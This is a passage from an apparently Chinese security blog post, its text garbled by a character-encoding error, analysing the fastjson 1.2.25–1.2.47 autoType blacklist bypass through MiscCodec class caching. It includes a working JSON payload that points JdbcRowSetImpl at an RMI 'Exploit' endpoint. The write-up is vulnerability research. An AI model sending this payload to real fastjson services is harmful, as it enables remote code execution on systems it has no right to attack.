</span></span><span style="display:flex;"><span>                clazz = classLoader.<span style="color:#007f7f">loadClass</span>(className);
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (cache) {
</span></span><span style="display:flex;"><span>                    mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å¦‚æœå¤±è´¥ï¼Œæˆ–æ²¡æœ‰æŒ‡å®š ClassLoader ï¼Œåˆ™ä½¿ç”¨å½“å‰çº¿ç¨‹çš„ contextClassLoader æ¥åŠ è½½ç±»ï¼Œä¹Ÿéœ€è¦ cache ä¸º true æ‰èƒ½å†™å…¥ mappings ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            ClassLoader contextClassLoader = Thread.<span style="color:#007f7f">currentThread</span>().<span style="color:#007f7f">getContextClassLoader</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(contextClassLoader != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; contextClassLoader != classLoader){
</span></span><span style="display:flex;"><span>                clazz = contextClassLoader.<span style="color:#007f7f">loadClass</span>(className);
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (cache) {
</span></span><span style="display:flex;"><span>                    mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// å¦‚æœè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™ä½¿ç”¨ Class.forName æ¥è·å– class å¯¹è±¡å¹¶æ”¾å…¥ mappings ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            clazz = Class.<span style="color:#007f7f">forName</span>(className);
</span></span><span style="display:flex;"><span>            mappings.<span style="color:#007f7f">put</span>(className, clazz);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span>(Throwable e){
</span></span><span style="display:flex;"><span>            <span style="color:#007f7f">// skip
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> clazz;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç”±ä»¥ä¸Šä»£ç å¯çŸ¥ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ï¼Œå°±å¯ä»¥å¾€ <code>mappings</code> ä¸­å†™å…¥ä»»æ„ç±»åã€‚
<code>loadClass</code> ä¸€å…±æœ‰ä¸‰ä¸ªé‡è½½æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195119193.png" alt="image-20221014195119193"  />
</p>
<p>æˆ‘ä»¬éœ€è¦æ‰¾åˆ°è°ƒç”¨è¿™äº›æ–¹æ³•çš„ç±»ï¼Œå¹¶çœ‹æ˜¯å¦èƒ½å¤Ÿä¸ºæˆ‘ä»¬æ§åˆ¶ï¼š</p>
<ul>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache)</code>ï¼šè°ƒç”¨é“¾å‡åœ¨ <code>checkAutoType()</code> å’Œ <code>TypeUtils</code> é‡Œè‡ªè°ƒç”¨ï¼Œç•¥è¿‡ã€‚</li>
<li><code>Class&lt;?&gt; loadClass(String className)</code>ï¼šé™¤äº†è‡ªè°ƒç”¨ï¼Œæœ‰ä¸€ä¸ª <code>castToJavaBean()</code> æ–¹æ³•ï¼Œæš‚æœªç ”ç©¶ã€‚</li>
<li><code>Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)</code>ï¼šæ–¹æ³•è°ƒç”¨ä¸‰ä¸ªå‚æ•°çš„é‡è½½æ–¹æ³•ï¼Œå¹¶æ·»åŠ å‚æ•° <code>true</code> ï¼Œä¹Ÿå°±æ˜¯ä¼šåŠ å…¥å‚æ•°ç¼“å­˜ä¸­ã€‚</li>
</ul>
<p>é‡ç‚¹çœ‹ä¸€ä¸‹ä¸¤ä¸ªå‚æ•°çš„ <code>loadClass</code> æ–¹æ³•åœ¨å“ªè°ƒç”¨ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image46_2.png" alt="46_2"  />
</p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬å…³æ³¨ <code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code> æ–¹æ³•ï¼Œè¿™ä¸ªç±»æ˜¯ç”¨æ¥å¤„ç†ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿç±»çš„ååºåˆ—åŒ–ç±»ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ <code>Class.class</code> ç±»ï¼Œæˆä¸ºäº†æˆ‘ä»¬çš„å…¥å£ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195720161.png" alt="image-20221014195720161"  />
</p>
<p>å¦‚æœ <code>parser.resolveStatus</code> ä¸º<code>TypeNameRedirect</code>ï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œè¿›å…¥ <code>if</code> è¯­å¥ï¼Œä¼šè§£æ <code>val</code> ä¸­çš„å†…å®¹å¹¶æ”¾å…¥ <code>objVal</code> ä¸­ï¼Œç„¶åä¼ å…¥ <code>strVal</code> ä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014195916805.png" alt="image-20221014195916805"  />
</p>
<p>åé¢çš„é€»è¾‘å¦‚æœ <code>class</code> æ˜¯ <code>Class.class</code> æ—¶ï¼Œå°†ä¼šè°ƒç”¨ <code>loadClass</code> æ–¹æ³•ï¼Œå°† <code>strVal</code> è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014200115296.png" alt="image-20221014200115296"  />
</p>
<h4 id="å°ç»“">å°ç»“<a hidden class="anchor" aria-hidden="true" href="#å°ç»“">#</a></h4>
<p>é¦–å…ˆè¦é¿å¼€<code>checkAutoType()</code>ä¸­<code>autoTypeSupport</code> é»˜è®¤ä¸º <code>false</code> æ—¶çš„æ£€æŸ¥ï¼Œä»ä¸¤ä¸ª<code>if</code>åˆ¤æ–­è¯­å¥å…¥æ‰‹å‘ç°åªæœ‰<code>TypeUtils.getClassFromMapping(typeName)</code>å¯èƒ½å¯¹<code>clazz</code>èµ‹å€¼ä½¿ç”¨ä¸¤ä¸ªå‚æ•°çš„<code>loadclass</code>å‘<code>mapping</code>ä¸­èµ‹å€¼<code>MiscCodec#deserialze</code> æ–¹æ³•è°ƒç”¨äº†ä¸¤ä¸ªå‚æ•°çš„<code>loadclass</code>.è°ƒç”¨ä¹‹å‰éœ€è¦æ»¡è¶³<code>parser.resolveStatus</code> ä¸º<code>TypeNameRedirect</code>ï¼ˆå€¼ä¸º2ï¼‰ æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ª<code>key</code>ä¸º <code>val</code> ï¼Œæ­¤æ—¶ä¼šå°†<code>val</code>çš„å†…å®¹æ”¾å…¥ <code>objVal</code> ä¸­ï¼Œç„¶åä¼ å…¥ <code>strVal</code> ä¸­ã€‚
æ¥ç€å¦‚æœ <code>class</code> æ˜¯ <code>Class.class</code> æ—¶ï¼Œå°†ä¼šè°ƒç”¨ <code>loadClass</code> æ–¹æ³•ï¼Œå°† <code>strVal</code> è¿›è¡Œç±»åŠ è½½å¹¶ç¼“å­˜ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥å°†æ¶æ„ç±»åå­˜åˆ°<code>val</code>ä¸­ï¼Œè¿™å°±å®Œæˆäº†æ¶æ„ç±»çš„åŠ è½½ï¼Œå¯ä»¥é¿å¼€å¼‚å¸¸çš„æŠ›å‡ºã€‚
å¦‚ä½•æ»¡è¶³<code>parser.resolveStatus</code> ä¸º<code>TypeNameRedirect</code>ï¼ˆå€¼ä¸º2ï¼‰ï¼Œåœ¨åé¢è°ƒè¯•ä¸­ä¼šè®²åˆ°</p>
<h4 id="è°ƒè¯•">è°ƒè¯•<a hidden class="anchor" aria-hidden="true" href="#è°ƒè¯•">#</a></h4>
<p>æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ª json ï¼š<code>{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;reus09&quot;}</code> ï¼Œè°ƒè¯•ä¸€ä¸‹ï¼š</p>
<p><code>JSON.parseObject()</code> è°ƒç”¨ <code>DefaultJSONParser</code> å¯¹ JSON è¿›è¡Œè§£æã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014201102367.png" alt="image-20221014201102367"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> è°ƒç”¨ <code>checkAutoType()</code> æ£€æŸ¥å¾…åŠ è½½ç±»çš„åˆæ³•æ€§ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014201422109.png" alt="image-20221014201422109"  />
</p>
<p>ç”±äº deserializers åœ¨åˆå§‹åŒ–æ—¶å°† <code>Class.class</code> è¿›è¡Œäº†åŠ è½½ï¼Œå› æ­¤ä½¿ç”¨ findClass å¯ä»¥æ‰¾åˆ°ï¼Œè¶Šè¿‡äº†åé¢ AutoTypeSupport çš„æ£€æŸ¥ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014200808338.png" alt="image-20221014200808338"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> è®¾ç½® resolveStatus ä¸º 2ã€‚<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202019095.png" alt="image-20221014202019095"  />
</p>
<p><code>DefaultJSONParser.parseObject()</code> æ ¹æ®ä¸åŒçš„ class ç±»å‹åˆ†é… deserialzerï¼ŒClass ç±»å‹ç”± <code>MiscCodec.deserialze()</code> å¤„ç†ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202129027.png" alt="image-20221014202129027"  />
</p>
<p>è§£æ json ä¸­ â€œvalâ€ ä¸­çš„å†…å®¹ï¼Œå¹¶æ”¾å…¥ objVal ä¸­ï¼Œå¦‚æœä¸æ˜¯ &ldquo;val&rdquo; å°†ä¼šæŠ¥é”™ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202252945.png" alt="image-20221014202252945"  />
</p>
<p>ä¼ é€’è‡³ strVal å¹¶ä½¿ç”¨ <code>loadClass</code> åŠ è½½å¹¶ç¼“å­˜ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202340313.png" alt="image-20221014202340313"  />
</p>
<p>æ­¤æ—¶æ¶æ„çš„ val æˆåŠŸè¢«æˆ‘ä»¬åŠ è½½åˆ° mappings ä¸­ï¼Œå†æ¬¡ä»¥æ¶æ„ç±»è¿›è¡Œ <code>@type</code> è¯·æ±‚æ—¶å³å¯ç»•è¿‡é»‘åå•è¿›è¡Œçš„é˜»æ‹¦ï¼Œå› æ­¤æœ€ç»ˆ payload ä¸ºï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;reus09&#34;</span>: {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;java.lang.Class&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;val&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style="display:flex;"><span>	},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;reus09&#34;</span>: {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;dataSourceName&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;autoCommit&#34;</span>: <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014202656498.png" alt="image-20221014202656498"  />
</p>
<h4 id="å½±å“ç‰ˆæœ¬åˆ†æ">å½±å“ç‰ˆæœ¬åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#å½±å“ç‰ˆæœ¬åˆ†æ">#</a></h4>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.32 æœªå¼€å¯ AutoTypeSupportï¼Œæ‰å¯ä»¥è¢«åˆ©ç”¨
å½±å“ç‰ˆæœ¬ï¼š1.2.33 &lt;= fastjson &lt;= 1.2.47ä¸è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½å¯ä»¥è¢«åˆ©ç”¨ã€‚</p>
<p>ä¸¤è€…åœ¨<code>checkAutoType</code>å®ç°çš„é€»è¾‘å…¶å®å·®ä¸å¤šï¼Œå…¶å®å°±æ˜¯åè€…å¯¹é»‘åå•è¯†åˆ«å‘½ä¸­æŠ¥é”™çš„æ—¶å€™ï¼Œé¢å¤–åŠ äº†æ¡ä»¶ï¼Œè¯¥ç±»æ— æ³•ä»ç¼“å­˜<code>mappings</code>ä¸­æ‰¾åˆ°æ‰ä¼šæŠ¥é”™ã€‚</p>
<p>ä¸¤è€…å®ç°åŸç†æœ¬è´¨ä¸Šéƒ½æ˜¯ä»£ç æ‰§è¡Œé¡ºåºçš„ç»•è¿‡ã€‚</p>
<h5 id="1225--fastjson--1232">1.2.25 &lt;= fastjson &lt;= 1.2.32<a hidden class="anchor" aria-hidden="true" href="#1225--fastjson--1232">#</a></h5>
<h6 id="autotypesupportä¸ºtrue">autoTypeSupportä¸ºtrue<a hidden class="anchor" aria-hidden="true" href="#autotypesupportä¸ºtrue">#</a></h6>
<p>åœ¨è¯¥ç‰ˆæœ¬ä¸­çš„<code>checkAutoType</code>æ–¹æ³•ä¸­ï¼Œå¦‚æœè¯†åˆ«åˆ°é»‘åå•é‡Œé¢çš„ç±»ç›´æ¥æŠ¥é”™<code>autoType is not support.</code></p>
<p>åœ¨åé»‘å•è¯†åˆ«åæ‰§è¡Œæ‰æ‰§è¡Œ<code>getClassFromMapping</code>æ–¹æ³•å’Œ<code>findClass</code>æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419180628036.png" alt="image-20230419180628036"  />
</p>
<p>åœ¨è§£ææˆ‘ä»¬çš„ç¬¬ä¸€æ®µ<code>payload</code>çš„æ—¶å€™</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#f00">reus</span><span style="color:#ff0;font-weight:bold">09</span><span style="color:#0ff;font-weight:bold">&#34;: {
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">		&#34;</span><span style="color:#f00">@type</span><span style="color:#0ff;font-weight:bold">&#34;: &#34;</span><span style="color:#f00">java.lang.Class</span><span style="color:#0ff;font-weight:bold">&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">		&#34;</span><span style="color:#f00">val</span><span style="color:#0ff;font-weight:bold">&#34;: &#34;</span><span style="color:#f00">com.sun.rowset.JdbcRowSetImpl&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f00">},</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸º<code>@type</code>æŒ‡å®šçš„ç±»<code>java.lang.Class</code>ä¸å±äºé»‘åå•ï¼Œå¹¶ä¸”å¯ä»¥åœ¨<code>clazz = this.deserializers.findClass(typeName);</code>è·å¾—å¯¹åº”çš„ååºåˆ—åŒ–<code>MiscCodec</code>ï¼Œåœ¨å®ƒçš„<code>deserialze</code>æ–¹æ³•ä¸­å®ç°äº†<code>TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())</code>æ–¹æ³•ï¼Œå°†å¯¹åº”çš„<code>val</code>çš„å€¼åŠ å…¥åˆ°<code>mappings</code>é‡Œé¢ã€‚</p>
<p>ä½†æ˜¯åœ¨è§£æç¬¬äºŒæ®µ<code>payload</code> çš„æ—¶å€™</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span><span style="color:#f00">:</span> {
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;com.sun.rowset.JdbcRowSetImpl&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;dataSourceName&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="font-weight:bold">&#34;autoCommit&#34;</span>: <span style="color:#fff;font-weight:bold">true</span>
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>com.sun.rowset.JdbcRowSetImpl</code>çš„<code>className</code>è¿˜æ¥å¾—åŠè¿›è¡Œ<code>mappings</code>çš„åˆ¤æ–­ï¼Œå°±è¢«é»‘åå•å¹²æ‰äº†ï¼ŒæŠ¥é”™äº†ã€‚</p>
<p>å› æ­¤autoTypeSupportå¼€å¯çš„æ—¶å€™ï¼Œï¼Œpayloadä¸èµ·æ•ˆæœ</p>
<h6 id="autotypesupportä¸ºfalse">autoTypeSupportä¸ºfalse<a hidden class="anchor" aria-hidden="true" href="#autotypesupportä¸ºfalse">#</a></h6>
<p>å¦‚ä¸Šé¢çš„åˆ†æä¸€æ ·ï¼Œå¦‚æœautoTypeSupportä¸ºfalseï¼Œé‚£ä¹ˆåœ¨è¿›è¡Œ<code>if(!autoTypeSupport)</code>å‰ï¼Œå³æ‰§è¡Œé»‘ç™½åå•åˆ¤æ–­å‰ï¼Œå°±ä¼šå…ˆæ‰§è¡Œ<code>getClassFromMapping</code>æ–¹æ³•å’Œ<code>findClass</code>æ–¹æ³•ã€‚</p>
<p>é‚£ä¹ˆåœ¨è§£æç¬¬ä¸€æ®µ<code>payload</code>çš„æ—¶å€™ï¼Œç›´æ¥å°±å¯ä»¥é€šè¿‡<code>clazz = this.deserializers.findClass(typeName);</code>è·å¾—ååºåˆ—åŒ–å™¨<code>MiscCodec</code>ï¼Œå¹¶å°†<code>clazz</code>èµ‹ä¸º<code>java.lang.class</code>ï¼Œç„¶åç¨‹åºå› ä¸º<code>clazz</code>ä¸ä¸ºç©ºï¼Œç›´æ¥è¿”å›<code>clazz</code>ï¼Œè¿™æ ·å°±è·³è¿‡äº†é»‘ç™½åå•çš„å®¡æŸ¥ã€‚ç„¶ååç»­<code>MiscCodec</code>çš„<code>deserialze</code>æ–¹æ³•å°†valå¯¹åº”çš„å€¼<code>com.sun.rowset.JdbcRowSetImpl</code>åŠ å…¥åˆ°<code>mappings</code>ä¸­ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419183000247.png" alt="image-20230419183000247"  />
</p>
<p>ç„¶ååœ¨è§£æç¬¬äºŒæ®µ<code>payload</code>çš„æ—¶å€™ï¼Œ<code>TypeUtils.getClassFromMapping(typeName)</code>ç›´æ¥ä»<code>mappings</code>ä¸­è·å–ç¼“å­˜çš„ç±»åï¼Œç„¶åç›´æ¥è¿”å›ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419183315468.png" alt="image-20230419183315468"  />
</p>
<p>ä¹‹åçš„ååºåˆ—åŒ–å°±ä¸å†è®²äº†ã€‚</p>
<h5 id="1233--fastjson--1247">1.2.33 &lt;= fastjson &lt;= 1.2.47<a hidden class="anchor" aria-hidden="true" href="#1233--fastjson--1247">#</a></h5>
<p><code>1.2.33~1.2.47</code>ä¹‹é—´çš„<code>checkAutoType</code>æ–¹æ³•å’Œä¹‹å‰çš„æœ‰æ‰€æ”¹åŠ¨ï¼Œåªæœ‰è¯†åˆ«åˆ°ç±»åœ¨é»‘åå•ä¸­å¹¶ä¸”åŒæ—¶æ— æ³•ä»<code>mappings</code>ä¸­è·å–ï¼Œæ‰ä¼šæŠ¥é”™autoType is not supportã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419184017575.png" alt="image-20230419184017575"  />
</p>
<h6 id="autotypesupportä¸ºtrue-1">autoTypeSupportä¸ºtrue<a hidden class="anchor" aria-hidden="true" href="#autotypesupportä¸ºtrue-1">#</a></h6>
<p>ç¬¬ä¸€æ®µ<code>payload</code>ç›´æ¥é€šè¿‡<code>clazz = this.deserializers.findClass(typeName);</code>ï¼Œæ‰¾åˆ°ååºåˆ—åŒ–å™¨<code>MiscCodec</code>ï¼Œç„¶åé€šè¿‡å®ƒçš„<code>deserize</code>æ–¹æ³•å®ç°å°†<code>val</code>çš„å€¼<code>com.sun.rowset.JdbcRowSetImpl</code>æ·»åŠ åˆ°<code>mappings</code>ä¸­ã€‚</p>
<p>ç¬¬äºŒæ®µ<code>payload</code>å› ä¸º<code>com.sun.rowset.JdbcRowSetImpl</code>åœ¨<code>mappings</code>ä¸­å­˜å‚¨ç€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿‡é»‘åå•çš„æŠ¥é”™ï¼Œç„¶åé€šè¿‡<code>clazz = TypeUtils.getClassFromMapping(typeName)</code>è·å¾—å¯¹åº”çš„<code>clazz</code>ï¼Œæœ€åæ‰§è¡Œå®ƒçš„ååºåˆ—åŒ–ã€‚</p>
<h6 id="autotypesupportä¸ºfalse-1">autoTypeSupportä¸ºfalse<a hidden class="anchor" aria-hidden="true" href="#autotypesupportä¸ºfalse-1">#</a></h6>
<p>åˆ©ç”¨é“¾å’Œ<code>autoTypeSupport</code>ä¸ºtrueçš„æƒ…å†µä¸€æ ·ã€‚</p>
<p>å®é™…ä¸Šï¼Œè¿™ä¸ªç‰ˆæœ¬çš„<code>fastJson</code>å®ç°çš„æ˜¯å¯¹é»‘åå•æŠ¥é”™é¢å¤–åŠ æ¡ä»¶(ç¼“å­˜mappingsä¸­æ²¡æœ‰è¯¥ç±»)å¯¼è‡´çš„ã€‚</p>
<h3 id="fastjson-1268">fastjson-1.2.68<a hidden class="anchor" aria-hidden="true" href="#fastjson-1268">#</a></h3>
<p>åœ¨ 1.2.47 ç‰ˆæœ¬æ¼æ´çˆ†å‘ä¹‹åï¼Œå®˜æ–¹åœ¨ 1.2.48 å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ <code>MiscCodec</code> å¤„ç† Class ç±»çš„åœ°æ–¹ï¼Œè®¾ç½®äº†cache ä¸º false ï¼Œå¹¶ä¸” <code>loadClass</code> é‡è½½æ–¹æ³•çš„é»˜è®¤çš„è°ƒç”¨æ”¹ä¸ºä¸ç¼“å­˜ï¼Œè¿™å°±é¿å…äº†ä½¿ç”¨äº† Class æå‰å°†æ¶æ„ç±»åç¼“å­˜è¿›å»ã€‚</p>
<p><code>MisCodec</code>çš„<code>deserialze</code>æ–¹æ³•ä¸­è°ƒç”¨<code>TypeUtils.loadClass</code>æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230419234445180.png" alt="image-20230419234445180"  />
</p>
<p><code>loadClass</code>é»˜è®¤çš„cacheä¹Ÿè®¾ç½®ä¸ºfalse</p>
